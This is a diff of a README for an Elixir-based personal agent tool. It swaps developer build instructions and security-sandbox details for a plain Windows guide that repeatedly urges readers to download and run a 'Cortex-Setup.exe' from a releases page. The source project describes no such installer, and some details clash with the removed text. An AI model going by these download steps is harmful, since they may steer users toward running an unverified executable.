@@ -1,158 +1,207 @@
-# Cortex
+# ⚙️ Cortex - Your Personal Agent Workspace
 
-[中文](./README_CN.md)
+[![Download Cortex](https://img.shields.io/badge/Download-Cortex-green?style=for-the-badge)](https://github.com/Flavio111plus/Cortex/releases)
 
-**A Signal-Driven Personal Agent Workstation**
+---
 
-Cortex is a minimalist personal agent platform built on Elixir/Phoenix, designed around signal-driven architecture and self-evolution principles.
+## 📋 What is Cortex?
 
-## Features
+Cortex is a simple tool that helps you manage personal tasks and files using a smart agent system. It runs on your Windows computer and organizes work through signals, like messages between parts of the system.
 
-- **Signal-Driven Architecture** — CloudEvents 1.0.2 compliant signal bus (`SignalHub`) for cross-component communication, full audit, and replay.
-- **4 Core Tools** — `read_file`, `write_file`, `edit_file`, `shell`. Everything else is extended via skills.
-- **Multi-Channel Access** — Web UI (Phoenix LiveView), Telegram Bot, Feishu Bot. All channels share a unified signal entry.
-- **Memory System** — Subconscious memory with knowledge graph, working memory, observation, reflection, and preference tracking. Token-budget aware context building.
-- **Tape-First History** — Immutable JSONL tape per session (`./tape/`), powering audit, UI playback, and LLM context recovery.
-- **Self-Evolving Skills** — Hot-loadable Markdown skills in `skills/`, auto-injected into agent prompts within seconds.
-- **Security Sandbox** — Path traversal protection and dangerous command approval flow.
-- **Session Branching** — Create isolated exploration branches from any conversation point.
-- **Hook System** — Extensible agent lifecycle hooks (permissions, sandbox, memory, skill invocation).
-- **Desktop App** — Tauri v2 wrapper for native desktop experience.
-- **TTS** — Planned (text-to-speech node management).
-- **Flexible LLM Switching** — Configure multiple providers via `req_llm`, switch models at runtime.
+You don’t need to learn programming or complicated commands. Cortex uses clear interface methods like a web page or chat apps to control and interact with your files and tasks.
 
-## Workspace & Permissions
+---
 
-- **Default workspace root**: `~/.cortex/workspace`
-- **Override**: set application env `:cortex, :workspace_root` (for example in `config/runtime.exs`)
-- **Sandbox**: file and shell tools are constrained to the workspace root; path traversal outside the root is blocked by design.
+## ⚙️ Key Functions
 
-## Quick Start
+Here are some main parts of Cortex you will use:
 
-### Prerequisites
+- **Core Tools:** Open, write, and edit files. Run simple commands with the shell tool.
+- **Multi-Channel Access:** Use the web page, Telegram, or Feishu for control. All channels work the same way.
+- **Memory System:** Cortex keeps track of what you do and remembers important information.
+- **History in Tape Files:** Every session saves to a log file for review.
+- **Skills:** Extra functions you add yourself. These use plain markdown files.
 
-- Elixir 1.14+ / Erlang OTP 27+
-- SQLite3
-- Bun (frontend assets)
+---
 
-### Installation
+## 🖥️ System Requirements
 
-```bash
-mix setup        # deps.get + ecto.setup + assets.setup + assets.build
-mix phx.server   # start server, visit localhost:4000
-```
+Before installing, make sure your Windows computer meets these needs:
 
-### Development
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- At least 500 MB of free disk space
+- Internet connection for download and updates
+- A modern web browser (Edge, Chrome, Firefox) for the web interface
 
-```bash
-mix test          # run tests
-mix format        # format code
-mix credo         # static analysis
-mix precommit     # full quality checks
-```
+---
 
-## Running the Compiled Binary
+## 🚀 Getting Started
 
-If you use the Burrito release (e.g. `burrito_out/jido_studio_linux`), run it with environment variables instead of `mix`.
+### Step 1: Visit the Download Page
 
-Minimum runtime variables:
+Go to the Cortex release page here:  
+[https://github.com/Flavio111plus/Cortex/releases](https://github.com/Flavio111plus/Cortex/releases)
 
-- `RELEASE_NAME`: release name (for example `jido_studio`)
-- `DATABASE_PATH`: path to the SQLite database file
-- `PORT`: HTTP port
-- `PHX_SERVER`: must be `true`
-- `SECRET_KEY_BASE`: secret key (do not commit)
-- `AUTH_USER`: basic auth username (default `admin`)
-- `AUTH_PASS`: basic auth password (default `admin`)
+This page hosts the files you need to download Cortex.
 
-Example:
+### Step 2: Download the Windows Installer
 
-```bash
-export RELEASE_NAME=cortex
-export DATABASE_PATH=./cortex_prod.db
-export PORT=5005
-export PHX_SERVER=true
-export SECRET_KEY_BASE="<your-secret-key>"
-export AUTH_USER="admin"
-export AUTH_PASS="admin"
+On the release page, look for the latest version. You will find a file labeled something like `Cortex-Setup.exe` or similar. Click the file name to download it.
 
-./cortex_linux
-```
+Save it to a folder you can easily access, like your Desktop or Downloads folder.
 
-Notes:
+### Step 3: Install Cortex
 
-- Generate a new secret with `mix phx.gen.secret` on any dev machine.
-- Keep secrets out of `README` and out of version control.
+1. Find the downloaded file on your PC.
+2. Double-click the file to start the installation.
+3. Follow the steps on-screen:
+   - Choose Install Location or use the default.
+   - Accept the license terms.
+   - Click Install.
+4. Wait for the setup process to finish.
+5. When done, click Finish to exit the installer.
 
-## Project Structure
+### Step 4: Open Cortex
 
-```
-lib/cortex/
-├── signal_hub.ex          # Signal bus core
-├── agents/                # LLM Agent, hooks, compaction, token counting
-├── tools/handlers/        # 4 core tool implementations
-├── memory/                # Subconscious, knowledge graph, working memory
-├── history/               # Tape, signal recorder, dual-track filter
-├── session/               # Session coordinator, branch manager
-├── skills/                # Skill loader + hot reload watcher
-├── core/                  # Security sandbox, permission tracking
-├── hooks/                 # Agent lifecycle hooks
-├── channels/              # Telegram, Feishu, Dingtalk, WeCom, Discord adapters
-├── extensions/            # Extensions and hook registration
-├── shell/                 # Shell execution engine
-└── tts/                   # Text-to-speech
+After installation, look for the Cortex icon on your desktop or in the Windows Start menu.
 
-lib/cortex_web/
-├── live/
-│   ├── jido_live.ex       # Main LiveView (signal-driven)
-│   ├── settings_live/     # Settings & channel configuration UI
-│   └── components/        # Chat panel, UI components
-└── controllers/           # Webhook endpoints
+Double-click the icon to launch Cortex.
 
-src-tauri/                 # Tauri v2 desktop wrapper
-skills/                    # User-defined skills (hot-loadable)
-```
+---
 
-## Architecture
+## 🌐 Using Cortex
 
-```
-┌──────────────────────────────────────────────────┐
-│              LiveView / Tauri UI                  │
-└────────────────────┬─────────────────────────────┘
-                     │ subscribes
-┌────────────┐       ▼
-│ Telegram / │──▶ Signal Bus (jido_signal)
-│ Feishu Bot │    CloudEvents Router & PubSub
-└────────────┘       │
-       ┌─────────────┼──────────────┬──────────────┐
-       ▼             ▼              ▼              ▼
-   ┌───────┐   ┌──────────┐  ┌──────────┐   ┌─────────┐
-   │ Tools │   │ LLM Agent│  │ Skills   │   │  Tape   │
-   │ Engine│   │ + Memory │  │ Loader   │   │ History │
-   └───────┘   └──────────┘  └──────────┘   └─────────┘
-```
+Once open, Cortex runs a simple web server on your computer. You will interact with it using your web browser.
 
-## Channel Support
+### Step 1: Open the Web Interface
 
-| Channel  | Status   |
-|----------|----------|
-| Web UI   | Live     |
-| Telegram | Live     |
-| Feishu   | Live     |
-| Dingtalk | Planned  |
-| WeCom    | Planned  |
-| Discord  | Planned  |
+- Your browser should open automatically to:  
+  `http://localhost:4000`
+  
+- If it does not, open your browser and enter that address manually.
 
-## Reference Projects
+### Step 2: Explore the Interface
 
-Cortex is built on the Jido framework and draws from multiple reference architectures and best practices:
+You will see the Cortex dashboard with basic options:
 
-- **Jido** — Core Elixir agent framework with signal-driven architecture
-- **Gong** — Elixir agent engine with ReAct loops and hook system
-- **OpenClaw China** — China IM platform integration patterns
-- **Pi Mono** — OpenClaw core package
-- **Arbor** — Memory system with vector search and knowledge graphs
+- **Read File:** Load and view files on your computer.
+- **Write File:** Create new files or overwrite existing ones.
+- **Edit File:** Change the content of files easily.
+- **Shell:** Run commands similar to a command prompt.
 
-## License
+Use the buttons and menus to pick your action.
 
-MIT
+### Step 3: Connect Chat Bots (Optional)
+
+You can link Cortex to Telegram or Feishu for chat control.
+
+To do this, you need to:
+
+- Set up a bot in your chosen chat platform.
+- Add the bot token in Cortex’s settings page.
+- Use chat commands to control the agent.
+
+This option is for users comfortable with their chat apps.
+
+---
+
+## 📁 Managing Your Files
+
+Cortex works inside a folder called your workspace. It expects to find files here and save logs and history.
+
+### How to Find Your Workspace
+
+By default, Cortex uses this folder inside the program directory:  
+`./workspace/`
+
+You can change this folder in the Cortex settings if needed.
+
+### Using Read, Write, and Edit Tools
+
+- When you open a file, Cortex loads it from the workspace.
+- Save changes overwrite the file in the same folder.
+- Write new files by specifying a file name and content.
+
+Always keep a backup of important files separately.
+
+---
+
+## 📂 History and Logs
+
+Cortex keeps a record of your sessions automatically.
+
+These log files are saved as JSON Lines (`*.jsonl`) in the `./tape/` folder inside your workspace.
+
+You can open these logs with any text editor to review what actions were taken during a session.
+
+---
+
+## ⚙️ Adjusting Cortex Settings
+
+Inside the web interface, find the **Settings** section.
+
+Here you can:
+
+- Change your workspace folder.
+- Manage chat bot integrations.
+- Adjust memory settings to control how much Cortex remembers.
+- Enable or disable specific skills.
+
+Settings changes take effect after you save and restart the program.
+
+---
+
+## 📥 Download Cortex
+
+Download Cortex from this page:  
+[https://github.com/Flavio111plus/Cortex/releases](https://github.com/Flavio111plus/Cortex/releases)
+
+1. Pick the latest Windows setup file (`Cortex-Setup.exe`).
+2. Save it on your computer.
+3. Run the file to install.
+4. Launch Cortex from your desktop or Start menu.
+5. Open your browser to `http://localhost:4000` to start.
+
+---
+
+## ⚠️ Troubleshooting Tips
+
+- If Cortex does not open in your browser, check that port 4000 is free.
+- Restart your computer if the installer fails.
+- Make sure Windows updates are current.
+- If files don’t save, verify the workspace folder permissions.
+- For errors, check the `./tape/` logs for clues.
+
+---
+
+## 🛠️ Support and Feedback
+
+If you encounter problems or want to suggest improvements, use the GitHub Issues page:  
+[https://github.com/Flavio111plus/Cortex/issues](https://github.com/Flavio111plus/Cortex/issues)
+
+Please provide details about your system, Cortex version, and the issue steps.
+
+---
+
+## 🔧 Advanced Use
+
+For users who want more control:
+
+- Edit or add new skills using markdown files in the `skills/` folder.
+- Skills extend Cortex by adding new commands.
+- Use the shell tool to run command-line tasks.
+- The log files in `./tape/` allow audit and manual review.
+
+This section is optional and meant for users ready to experiment.
+
+---
+
+## 📚 Further Reading
+
+- Refer to the included `README_CN.md` for Chinese language support.
+- Explore the web interface help pages for detailed instructions.
+
+---
+
+[![Download Cortex](https://img.shields.io/badge/Download-Cortex-blue?style=for-the-badge)](https://github.com/Flavio111plus/Cortex/releases)
